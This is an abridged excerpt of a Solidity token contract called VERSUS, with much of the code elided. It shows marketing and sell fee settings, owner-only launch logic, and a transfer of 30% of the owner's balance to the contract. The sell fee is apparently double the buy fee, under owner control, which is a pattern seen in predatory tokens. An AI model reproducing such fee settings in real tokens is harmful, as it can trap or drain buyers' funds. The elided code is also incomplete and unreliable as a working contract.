...
contract VERSUS is Context, IERC20Upgradeable {
    ...
    uint256 public _marketingFee = 3000;
    ...
    uint256 public _sellMarketingFee = 6000;
    ...
    uint256 public MarketShare = 8;
    uint256 public DevShare = 2;
    uint256 public ValueDivisor = 10;
    ...
    function LaunchToken(address payable setMarketWallet, address payable setDevWallet, string memory _tokenname, string memory _tokensymbol) external onlyOwner {
        ...
        _maxTxAmount = (_tTotal * 10000) / 10000;
        maxTxAmountUI = (startingSupply * 10000) / 10000;
        _maxWalletSize = (_tTotal * 10000) / 10000;
        maxWalletSizeUI = (startingSupply * 10000) / 10000;
        swapThreshold = (_tTotal * 5) / 10000000;
        swapAmount = (_tTotal * 5) / 100000;
        ...
        _transfer(owner(), address(this), ((balanceOf(owner()))*30/100));
